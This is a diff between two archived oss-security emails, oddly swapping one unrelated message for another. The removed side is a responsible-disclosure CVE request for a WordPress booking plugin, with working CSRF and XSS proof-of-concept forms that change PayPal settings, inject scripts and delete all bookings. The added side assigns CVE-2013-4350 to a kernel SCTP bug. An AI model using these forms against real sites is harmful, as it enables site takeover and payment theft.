@@ -1,243 +1,64 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/09/09/7
-Message-Id: <20130909170916.5388220134@smtp.hushmail.com>
-Date: Mon, 09 Sep 2013 19:09:16 +0200
-From: "Adéla Goldová" <roguecoder@...h.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/09/13/3
+Message-ID: <5233640E.60102@redhat.com>
+Date: Fri, 13 Sep 2013 13:14:22 -0600
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: [CVE Request] Event Easy Calendar
+Subject: Re: CVE request -- Linux kernel: net: sctp: ipv6 ipsec encryption bug in sctp_v6_xmit
 Content-Type: text/plain; charset=utf-8
 
-On request I am re-sending the request including the full report with proof of concepts. Hopefully this will help :)
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Can someone please assign CVE's to this?
+On 09/13/2013 07:38 AM, Petr Matousek wrote:
+> Alan Chester reported an issue with IPv6 on SCTP that IPsec traffic
+> is not being encrypted, whereas on IPv4 it is. Setting up an AH +
+> ESP transport does not seem to have the desired effect:
+> 
+> SCTP + IPv4:
+> 
+> 22:14:20.809645 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags
+> [DF], proto AH (51), length 116) 192.168.0.2 > 192.168.0.5:
+> AH(spi=0x00000042,sumlen=16,seq=0x1):ESP(spi=0x00000044,seq=0x1),
+> length 72 22:14:20.813270 IP (tos 0x2,ECT(0), ttl 64, id 0, offset
+> 0, flags [DF],proto AH (51), length 340) 192.168.0.5 > 192.168.0.2:
+> AH(spi=0x00000043,sumlen=16,seq=0x1):
+> 
+> SCTP + IPv6:
+> 
+> 22:31:19.215029 IP6 (class 0x02, hlim 64, next-header SCTP
+> (132)payload length: 364) fe80::222:15ff:fe87:7fc.3333 >
+> fe80::92e6:baff:fe0d:5a54.36767:sctp 1) [INIT ACK] [init tag:
+> 747759530] [rwnd: 62464] [OS: 10] [MIS:10]
+> 
+> References: https://bugzilla.kernel.org/show_bug.cgi?id=24412 
+> https://bugzilla.redhat.com/show_bug.cgi?id=1007872
+> 
+> Upstream fix: 
+> http://git.kernel.org/cgit/linux/kernel/git/davem/net.git/commit/?id=95ee62083cb6453e056562d91f597552021e6ae7
+>
+>  Thanks,
+> 
 
-Details
-========================
-Application: Event Easy Calendar
-Version: 1.0.0
-Type: WordPress Plugin
-Vendor: Adamson ( http://profiles.wordpress.org/adamson/ )
-Url: http://wordpress.org/plugins/event-easy-calendar/
-Vulnerability:
-- Cross-Site Scripting (CWE-79)
-- Cross-Site Request Forgery (CWE-352)
+Please use CVE-2013-4350 for this issue.
 
-Description
-========================
-Events Easy Calendar will enable WordPress sites to manage all their bookings and appointments.
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (GNU/Linux)
 
-Vulnerability
-========================
-This plugin contains CSRF on all forms and some are also vulnerable to XSS. This entire plugin can be remotely controlled by crafting arbitrary payloads and send a malicious link to a site admin. By doing this you can create and update customers, create new services/cupons, change settings, enable reminders/auto approval, delete all bookings, etc. It's also possible to modify the PayPal recipient email address, so that all payments are sent to the attacker instead of the intended recipient. The cost of any services are also easily modified.
-
-Some of the fields are also vulnerable to XSS, but due to a string length limit this is not posing any real risk.
-
-Proof of Concept
-========================
-Add Customer
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="data-table_length" value="10">
-    <input type="hidden" name="radioservice" value="1">
-    <input type="hidden" name="hdServiceTypeDDL" value="">  
-    <input type="hidden" name="uxTxtControl1" value="new@...r.com">
-    <input type="hidden" name="uxTxtControl2" value="<script>alert(1)</script>">
-    <input type="hidden" name="hiddeninputname" value="">   
-    <input type="hidden" name="hiddeninputname" value="">   
-    <input type="hidden" name="uxHdnTotalCost" value="0.00">
-    <input type="hidden" name="param" value="addNewCustomer">
-    <input type="hidden" name="action" value="bookingsLibrary">
-    <input type="submit" value="Add Customer">
-</form>
-
-Update Customer
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="data-table_length" value="10">
-    <input type="hidden" name="radioservice" value="2">
-    <input type="hidden" name="hdServiceTypeDDL" value="">  
-    <input type="hidden" name="uxTxtControl1" value="new@...r.com">
-    <input type="hidden" name="uxTxtControl2" value="NewUser">
-    <input type="hidden" name="hiddeninputname" value="">   
-    <input type="hidden" name="hiddeninputname" value="">   
-    <input type="hidden" name="uxHdnTotalCost" value="100.00">
-    <input type="hidden" name="customerId" value="3">
-    <input type="hidden" name="uxCustomerEmail" value="new@...r.com">
-    <input type="hidden" name="param" value="upDateCustomer">
-    <input type="hidden" name="action" value="bookingsLibrary">
-    <input type="submit" value="Update Customer">
-</form>
-
-New Booking
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="altField" value="2013-08-15">
-    <input type="hidden" name="serviceId" value="2">
-    <input type="hidden" name="customerId" value="5">
-    <input type="hidden" name="uxCouponCode" value="">  
-    <input type="hidden" name="uxNotes" value="">   
-    <input type="hidden" name="bookingTime" value="900">
-    <input type="hidden" name="param" value="frontEndMutipleDates">
-    <input type="hidden" name="action" value="bookingsLibrary">
-    <input type="submit" value="New Booking">
-</form>
-
-Add Service
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxServiceColor" value="#00ff00">
-    <input type="text" name="uxServiceName" value="CSRF service<script>alert(1)</script>">
-    <input type="hidden" name="uxServiceCost" value="0">
-    <input type="hidden" name="uxServiceType" value="0">
-    <input type="hidden" name="uxMaxBookings" value="1">
-    <input type="hidden" name="uxFullDayService" value="">
-    <input type="hidden" name="uxMaxDays" value="1">
-    <input type="hidden" name="uxCostType" value="0">
-    <input type="hidden" name="uxServiceHours" value="00">
-    <input type="hidden" name="uxServiceMins" value="30">
-    <input type="hidden" name="uxStartTimeHours" value="9">
-    <input type="hidden" name="uxStartTimeMins" value="0">
-    <input type="hidden" name="uxStartTimeAMPM" value="AM">
-    <input type="hidden" name="uxEndTimeHours" value="5">
-    <input type="hidden" name="uxEndTimeMins" value="0">
-    <input type="hidden" name="uxEndTimeAMPM" value="PM">
-    <input type="hidden" name="param" value="addService">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Add Service">
-</form>
-
-Add Block Out
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxExceptionsServices" value="4">
-    <input type="hidden" name="uxExceptionsIntervals" value="1">
-    <input type="hidden" name="uxExceptionsRepeatDay" value="1">
-    <input type="hidden" name="uxExceptionsStartsOn" value="">
-    <input type="hidden" name="uxExceptionsStartTimeHours" value="09">
-    <input type="hidden" name="uxExceptionsStartTimeMins" value="00">
-    <input type="hidden" name="uxExceptionsStartTimeAMPM" value="AM">
-    <input type="hidden" name="uxExceptionsEndTimeHours" value="05">
-    <input type="hidden" name="uxExceptionsEndTimeMins" value="00">
-    <input type="hidden" name="uxExceptionsEndTimeAMPM" value="PM">
-    <input type="hidden" name="uxExceptionsDay" value="0">
-    <input type="hidden" name="uxExceptionsDayEndsOn" value="">
-    <input type="hidden" name="uxExceptionsWeekDay1" value="Sun">
-    <input type="hidden" name="uxExceptionsWeekDay2" value="Wed">
-    <input type="hidden" name="uxExceptionsRepeatWeeks" value="9">
-    <input type="hidden" name="uxExceptionsWeekStartsOn" value="2013-08-22">
-    <input type="hidden" name="uxExceptionsWeekStartTimeHours" value="09">
-    <input type="hidden" name="uxExceptionsWeekStartTimeMins" value="00">
-    <input type="hidden" name="uxExceptionsWeekStartTimeAMPM" value="AM">
-    <input type="hidden" name="uxExceptionsWeekEndTimeHours" value="05">
-    <input type="hidden" name="uxExceptionsWeekEndTimeMins" value="00">
-    <input type="hidden" name="uxExceptionsWeekEndTimeAMPM" value="PM">
-    <input type="hidden" name="uxExceptionsWeek" value="0">
-    <input type="hidden" name="uxExceptionsWeekEndsOn" value="">
-    <input type="hidden" name="param" value="insertExceptionWeeks">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Add Block Out">
-</form>
-
-Add Cupon
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxDefaultCoupon" value="XSS<script>alert('xss')</script>">
-    <input type="hidden" name="uxValidFrom" value="2013-08-15">
-    <input type="hidden" name="uxValidUpto" value="2013-08-22">
-    <input type="hidden" name="uxAmount" value="50">
-    <input type="hidden" name="uxDdlAmountType" value="1">
-    <input type="hidden" name="uxApplicableOnAllProducts" value="1">
-    <input type="hidden" name="uxDdlBookingServices" value="4">
-    <input type="hidden" name="param" value="addCoupons">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Add Cupon">
-</form>
-
-Default Settings
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxDdlDefaultCurrency" value="United States Dollar">
-    <input type="hidden" name="uxDdlDefaultCountry" value="United States of America">
-    <input type="hidden" name="uxDefaultDateFormat" value="0">
-    <input type="hidden" name="uxDefaultTimeFormat" value="0">
-    <input type="hidden" name="uxDefaultTimeZone" value="-5.0">
-    <input type="hidden" name="uxServiceDisplayFormat" value="0">
-    <input type="hidden" name="param" value="updateGeneralSettings">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Default Settings">
-</form>
-
-Reminder Settings
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxReminderSettings" value="1">
-    <input type="hidden" name="uxReminderInterval" value="1 hour">
-    <input type="hidden" name="param" value="UpdateReminderSettings">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Reminder Settings">
-</form>
-
-PayPal Settings
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    Email: <input type="text" name="uxMerchantEmailAddress" placeholder="enter your PayPal email here">
-    <input type="hidden" name="uxPayPal" value="1">
-    <input type="hidden" name="uxPayPalUrl" value="https://paypal.com/cgi-bin/webscr">
-    <input type="hidden" name="uxThankyouPageUrl" value="http://google.com">
-    <input type="hidden" name="uxCancellationUrl" value="http://google.com">
-    <input type="hidden" name="param" value="UpdatePaymentGateway">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="PayPal Settings">
-</form>
-
-Mailchimp Settings
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxMailChimp" value="1">
-    <input type="hidden" name="uxMailChimpApiKey" value="12345678">
-    <input type="hidden" name="uxMailChimpUniqueId" value="87654321">
-    <input type="hidden" name="uxDoubleOptIn" value="false">
-    <input type="hidden" name="uxWelcomeEmail" value="false">
-    <input type="hidden" name="param" value="UpdateAutoResponder">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Mailchimp Settings">
-</form>
-
-Facebook Connect
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxFacebookConnect" value="1">
-    <input type="hidden" name="uxFacebookAppId" value="12345678">
-    <input type="hidden" name="uxFacebookSecretKey" value="87654321">
-    <input type="hidden" name="param" value="UpdateFacebookSocialMedia">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Facebook Connect">
-</form>
-
-Auto Approve
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="uxAutoApprove" value="1">
-    <input type="hidden" name="param" value="AutoApprove">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Auto Approve">
-</form>
-
-Delete All Bookings
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="param" value="DeleteAllBookings">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Delete All Bookings">
-</form>
-
-Restore Factory Settings
-<form method="post" action="http://wordpress/wp-admin/admin-ajax.php">
-    <input type="hidden" name="param" value="RestoreFactorySettings">
-    <input type="hidden" name="action" value="dashboardLibrary">
-    <input type="submit" value="Restore Factory Settings">
-</form>
-
-Solution
-========================
-No fix by vendor at this point. Remove the plugin from your WordPress installation.
-
-Timeline
-========================
-2013-08-15 Wrote a comment pointing out to the vendor that there was some vulnerabilities and that a report would be made the same day. Comment was deleted.
-2013-08-15 Contacted the vendor through the plugin support section on wordpress.org, where I requested a valid email to send the report to.
-2013-08-16 Third and last message sent to vendor in an attempt to get a valid email address to send the report to
-2013-08-16 An email address were provided by the plugin developer
-2013-08-25 Vulnerability details were sent to the provided email address
-2013-09-02 Details were sent to plugins@...dpress.org
-2013-09-05 Email recieved from Wordpress
-2013-09-05 Verified that the plugin has been removed from the plugin directory
-2013-09-07 Publicly disclosed
-
+iQIbBAEBAgAGBQJSM2QOAAoJEBYNRVNeJnmTFd4P+O2iIuwkT/ufCulXrdvgmNRc
+x+H/25xgz6W55BbuM3ngHkYLbL8CGvVxhTt5ZloRLys3Fgrr87T9XQdKbM4e1Ead
+7f/VGsMHOi3WjetMxXt19Cqd8YP7N3ewRaI1r+f5y1876/J6jUbLmXlKv0Kh132a
+/ov/rnRAZZyYrULcQbDJJEEfDsg7mjnrhG+BNN9GKudX5gPVenzLjWHmPWxFg6cC
+dyuPN01LpG2u9izep2/MNT8rd13YRh4LacU7qT8gQ3ge8cvvyl2gKyq/gy1x1VlY
+vhbDiyjrMPilnvZqw//J33UNK7lMq1DOs6UGSqEg0Sz8lCYJW0wN3XbRE9x+HGng
+bJdzZE7dCYa1ESpTe/KyZAWjtXb/hSB2E7pRy9HSK8IfN7UzSSCdsUl/QwUpBdsN
+IQhvqPc/JvgwVC1vOD7Hp2MQy88OHLXQyd63txqpVYcRJAmRvn1nLDEwc9fT1Wsd
+IaBU6YZOodZcahBWBlT2CEqiFd8PbqOurZa+EvzdRs7b9zJbLLiNOrwvevWqBlOo
+0ZaajDdzy2Bwu57TNtn5283pm5VvvlsL/BhXEuEj1v0lNDrJNvA8XG0QB1NMKGu/
+bSZOM34whqdEdt32PIfjKHQC+SQb1cghQl10ZB6TjYe1JGFXZSCmkux39CPkph8R
+zybGMnRQvtMJQWi1+zw=
+=mOpZ
+-----END PGP SIGNATURE-----
